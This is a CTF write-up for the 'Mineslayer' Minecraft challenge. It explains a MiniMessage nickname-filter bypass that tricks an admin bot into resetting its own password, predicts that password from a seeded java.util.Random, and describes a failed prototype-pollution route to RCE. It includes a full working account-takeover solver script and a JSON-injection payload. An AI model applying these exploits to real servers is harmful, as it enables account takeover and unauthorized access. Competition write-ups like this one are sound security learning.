# Mineslayer - MidnightFlag CTF Writeup

**Category:** Misc / Web / Pwn
**Flags:** FLAG_1 (solved), FLAG_2 (RCE - unsolved)

## Challenge Overview

Mineslayer is a Minecraft-based CTF challenge running a Paper 1.21.8 server with custom plugins and two Node.js bots. The goal is to capture two flags:

- **FLAG_1**: Stored in an environment variable, accessible via the `/flag` operator command
- **FLAG_2**: Stored in `/root/flag.txt`, readable only via a SUID binary at `/getflag`

## Architecture

```
+-------------------+       +-------------------+
|   Paper Server    |       |   Admin Bot       |
|   (Java, 1.21.8) |<----->|   (Node.js)       |
|                   |       |   mineflayer      |
|  Plugins:         |       |   username:       |
|  - Mineslayer     |       |   "Administrator" |
|  - SimpleNicks    |       +-------------------+
|  - AuthMe         |
|  - LuckPerms      |       +-------------------+
|                   |       |  Mineslayer Bot   |
|  /getflag (SUID)  |       |  (Node.js)        |
|  /root/flag.txt   |       |  Spawned by /bot  |
+-------------------+       +-------------------+
```

**Key components:**

- **Mineslayer plugin** (`Mineslayer.jar`): Registers `/flag`, `/renew`, `/bot` commands. Filters nick changes for "unsafe" MiniMessage tags. Auto-ops the Administrator account on login.
- **Admin bot** (`bot/index.js`): Connects as `Administrator`, monitors chat for URLs. When one is detected, calls `/nick who <sender>` then `/renew <sender>` to reset the sender's password and kick them.
- **Mineslayer bot** (`mineslayer-bot/index.js`): Spawned by `/bot` command. Reads `config.json`, merges it with defaults using a vulnerable `merge()` function, connects via mineflayer, and runs commands from config.

## Source Code Analysis

### Mineslayer Plugin - Nick Filter

The plugin intercepts `/nick` commands and strips "unsafe" MiniMessage tags:

```java
private static final MiniMessage UNSAFE_TAG_STRIPPER = MiniMessage.builder()
    .tags(TagResolver.builder()
        .resolvers(
            StandardTags.translatable(),
            StandardTags.clickEvent(),
            StandardTags.hoverEvent(),
            StandardTags.insertion(),
            StandardTags.font(),
            StandardTags.selector(),
            StandardTags.keybind(),
            StandardTags.score(),
            StandardTags.nbt(),
            StandardTags.newline()
        )
        .build())
    .build();
```

The filter strips only the tags listed above. Crucially, **color tags are NOT in this list**.

The check:

```java
String stripped = UNSAFE_TAG_STRIPPER.stripTags(nickname);
if (!stripped.equals(nickname)) {
    event.setCancelled(true);
    // "Your nickname contains disallowed formatting tags"
}
```

If the stripped result equals the original, the nick is allowed through.

### Admin Bot - URL Monitoring

```javascript
const urlRegex = /(https?:\/\/[^\s]+)/i;
let targetUsername = ''

bot.on("message", (jsonMsg, position) => {
    if (position === "system") {
        msg = jsonMsg.getText()
        if (msg.includes('Users with the name')) {
            targetUsername = msg.split("- ")[1]  // update from /nick who response
        }
    }
})

bot.on('chat', (username, message) => {
  if (urlRegex.test(message)) {
    targetUsername = username
    bot.chat(`/nick who ${username}`)
    setTimeout(() => {
      bot.chat(`/renew ${targetUsername}`)  // uses shared var, possible TOCTOU
    }, 300)
  }
});
```

When the bot sees a URL in chat, it:
1. Sets `targetUsername` from the chat sender
2. Sends `/nick who <sender>` to look up the player
3. After 300ms, calls `/renew ${targetUsername}` which resets the target's AuthMe password and kicks them

### Password Generation - Predictable RNG

```java
private static Random getRandom() {
    if (random == null) {
        long seed = Bukkit.getWorld("world").getSeed();
        random = new Random(seed);
    }
    return random;
}
```

Passwords are generated using `java.util.Random` seeded with the world seed. The `docker-compose.yml` reveals:

```yaml
SEED: "1333333333333333337"
```

Since `java.util.Random` is deterministic, we can predict every password that will ever be generated. The first call generates the Administrator password, and subsequent calls to `/renew` generate predictable replacements.

### Mineslayer Bot - Prototype Pollution

```javascript
function merge(target, source) {
    for (let key of Object.keys(source)) {
        typeof target[key] !== "undefined" && typeof source[key] === "object" ?
            target[key] = merge(target[key], source[key]) :
            target[key] = source[key];
    }
    return target
}

const customConfig = JSON.parse(fs.readFileSync(path.resolve(configPath), 'utf8'))
defaultConf = {host: "localhost", username:"mineslayer-beta", port:25565}
config = merge(defaultConf, customConfig)
```

The `merge()` function is vulnerable to prototype pollution via `constructor.prototype`. The `/bot` command writes user-controlled commands into `config.json` **without escaping quotes**, enabling JSON injection:

```java
// BotCommand.java - NO ESCAPING on commands
jsonArray.append("\"").append(commands.get(i)).append("\"");
```

## FLAG_1: Admin Account Takeover

### The Bypass: `x<c:Administrator>`

The exploit uses the MiniMessage tag `<c:Administrator>` (a color tag shorthand with an invalid color value) to smuggle the string "Administrator" past three different systems that each handle MiniMessage differently:

**1. Mineslayer filter** - The `UNSAFE_TAG_STRIPPER` only recognizes specific dangerous tags (clickEvent, hoverEvent, etc.). Color tags (`<c:...>`) are not in the strip list. So `stripTags("x<c:Administrator>")` returns the string unchanged. Since `stripped == nickname`, the filter passes.

**2. SimpleNicks** - Uses a full MiniMessage deserializer to normalize nicks. The `<c:Administrator>` tag is recognized as a color tag, consuming "Administrator" as the color argument. The normalized plain text is just `"x"`. Since `"x"` doesn't match any registered player name, SimpleNicks allows the nick.

**3. Admin bot chat parsing** - When the player with nick `x<c:Administrator>` sends a chat message, the rendered chat message contains "Administrator" in a form that mineflayer's chat parsing extracts as the sender username. The bot then calls `/renew Administrator`, kicking the real admin and resetting its password.

### Predicting the Password

After `/renew Administrator` is called, a new password is generated using the seeded RNG. I precomputed the first several passwords by reimplementing `java.util.Random` with seed `1333333333333333337`:

```javascript
const PREDICTED = [
  '1HryYNeloPBLeWyY', 'T4sPU4pqZH_hR9iu', 'LLlAlGhSph1AU0Dk',
  'ZTLVc839AyI_qjcJ', 'MrMFEGGNUMzp3fhS'
]
```

The first password is the initial Admin password. When `/renew` is called, it generates the next one in sequence.

### Full Exploit Chain

1. Connect as `pwner`, register and login
2. Set nick: `/nick set x<c:Administrator>`
3. Post a URL in chat: `https://pwn`
4. Admin bot detects URL, extracts "Administrator", calls `/renew Administrator`
5. Real Administrator bot gets kicked with a new password
6. Wait for kick confirmation ("Administrator left the game")
7. Connect as `Administrator`, try predicted passwords until login succeeds
8. Run `/flag` to get FLAG_1

### Solver

```javascript
const mineflayer = require('mineflayer')
const host = process.env.MC_HOST || 'dyn-02.midnightflag.fr'
const port = Number.parseInt(process.env.MC_PORT || '11223', 10)

const PREDICTED = [
  '1HryYNeloPBLeWyY', 'T4sPU4pqZH_hR9iu', 'LLlAlGhSph1AU0Dk',
  'ZTLVc839AyI_qjcJ', 'MrMFEGGNUMzp3fhS'
]

function log (...a) { console.log(new Date().toISOString(), ...a) }
let done = false

// PHASE 1: Set exploit nick and trigger /renew Administrator
function phase1 () {
  log('=== PHASE 1: Exploit nick + trigger renew ===')
  const bot = mineflayer.createBot({ host, port, username: 'pwner', version: false })

  bot.on('error', (e) => {
    if (done) return
    if (['ECONNREFUSED', 'EAI_AGAIN'].includes(e.code)) setTimeout(phase1, 500)
  })
  bot.on('end', (r) => log('p1 end:', r))
  bot.on('kicked', (r) => {
    if (!done && JSON.stringify(r).includes('throttled')) setTimeout(phase1, 3000)
  })

  let authed = false
  bot.on('message', (j, p) => {
    const t = j.getText()
    if (p !== 'system') return

    // Handle AuthMe registration/login
    if (t.includes('/register')) bot.chat('/register Pw1_xR Pw1_xR')
    else if (t.includes('/login <password>')) bot.chat('/login Pw1_xR')
    else if (!authed && t.includes('Successful login!')) {
      authed = true
      log('Authenticated! Setting exploit nick...')
      bot.chat('/nick set x<c:Administrator>')
    }

    // Nick set confirmation -> post URL to trigger admin bot
    if (t.includes('Changed your nickname')) {
      log('Nick set! Posting URL...')
      setTimeout(() => bot.chat('https://pwn'), 300)
    }

    // Admin kicked -> start phase 2
    if (t === 'Administrator left the game') {
      log('*** ADMIN BOT KICKED! Starting Phase 2... ***')
      done = true
      bot.end()
      setTimeout(phase2, 500)
    }
  })

  setTimeout(() => {
    if (!done) { bot.end(); setTimeout(phase1, 2000) }
  }, 30000)
}

// PHASE 2: Login as Administrator with predicted password
function phase2 () {
  log('=== PHASE 2: Login as Administrator ===')
  let pwdIdx = 0, success = false

  function tryLogin () {
    if (success || pwdIdx >= PREDICTED.length * 2) {
      if (!success) { log('All passwords failed'); process.exit(1) }
      return
    }

    const pwd = PREDICTED[pwdIdx % PREDICTED.length]
    pwdIdx++

    const a = mineflayer.createBot({ host, port, username: 'Administrator', version: false })
    let connected = false

    a.on('error', () => { if (!success) setTimeout(tryLogin, 1000) })
    a.on('kicked', (r) => {
      if (success) return
      const t = JSON.stringify(r)
      if (t.includes('same username')) setTimeout(tryLogin, 2000)
      else if (t.includes('throttled')) setTimeout(tryLogin, 3000)
      else setTimeout(tryLogin, 1500)
    })
    a.on('end', () => { if (!success && !connected) setTimeout(tryLogin, 1000) })

    a.on('message', (j, p) => {
      const t = j.getText()
      if (p !== 'system') return

      if (t.includes('/login')) {
        connected = true
        log(`Trying: ${pwd}`)
        a.chat(`/login ${pwd}`)
      } else if (t.includes('Wrong')) {
        a.end()
      } else if (t.includes('Successful login')) {
        success = true
        log('*** ADMIN LOGIN SUCCESS! ***')
        setTimeout(() => a.chat('/flag'), 500)
      } else if (t.includes('MCTF{') || t.includes('FLAG')) {
        log('========== FLAG: ' + t + ' ==========')
        setTimeout(() => process.exit(0), 500)
      }
    })
  }

  tryLogin()
}

log(`Targeting ${host}:${port}`)
phase1()
setTimeout(() => { log('GLOBAL TIMEOUT'); process.exit(1) }, 300000)
```

Run with:
```bash
node scripts/remote_exploit.js
```

### Flags

```
FLAG_1: MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
FLAG_1 (revenge): MCTF{W1ll_Y0u_F1nd_4n0th3r_Byp4ss??}
```

## FLAG_2: RCE via Prototype Pollution (Analysis)

FLAG_2 requires executing `/getflag` on the remote server. The intended path appears to be through the `/bot` command's prototype pollution vulnerability.

### The Vulnerability

The `/bot` command writes user-controlled commands into `config.json` without escaping:

```java
jsonArray.append("\"").append(commands.get(i)).append("\"");
```

A payload like:
```
a"],"constructor":{"prototype":{"key":"value"}},"x":["b
```

Produces valid JSON that, when merged with defaults, pollutes `Object.prototype`:

```json
{"username":"mineslayer","commands":["a"],"constructor":{"prototype":{"key":"value"}},"x":["b"],"host":"localhost","port":25565}
```

### The Blocker

The prototype pollution successfully sets properties on `Object.prototype`. However, mineflayer's protocol compilation (via protodef) uses `for...in` loops on arrays in its container handlers:

```javascript
// protodef/src/datatypes/compiler-structures.js
function containerInlining (values) {
  const newValues = []
  for (const i in values) {  // <-- picks up PP entries from Object.prototype
    // ...
    newValues.push(values[i])
  }
  return newValues
}

// Container handler (same file)
for (const i in values) {  // <-- picks up PP entries AGAIN
  const { type, name, anon } = values[i]
  code += `let ${trueName} = value.${name}\n`
}
```

Each `for...in` on any array inherits all enumerable properties from `Object.prototype`. Since `containerInlining` pushes PP entries into a new array, AND the main handler's `for...in` also picks them up from the prototype, **each PP entry appears twice**, producing duplicate `let` declarations that cause a `SyntaxError` in the generated code.

The `eval(code)()` in `compiler.js:262` fails before any code executes.

### Attempted Approaches

- **NODE_OPTIONS PP**: Setting `Object.prototype.NODE_OPTIONS` doesn't affect the current process (already started) and child processes don't inherit PP from the parent's Object.prototype
- **Bitfield type trick**: Using `anon: true` + `type: ['bitfield', []]` to avoid duplicate `let` via the bitfield handler branch (uses `anon${i}Size` with different indices). Promising but causes infinite recursion when the bitfield type references itself through Object.prototype
- **Shell option PP**: Node 18.19.1's `child_process.execFile` uses `{__proto__: null, shell: false, ...options}` spread which blocks PP of the `shell` option
- **ajv bypass**: `validateSchema: false` prevents schema meta-validation, but object-valued PP entries cause stack overflow in `json-schema-traverse` through prototype self-reference

FLAG_2 was not solved during the CTF.
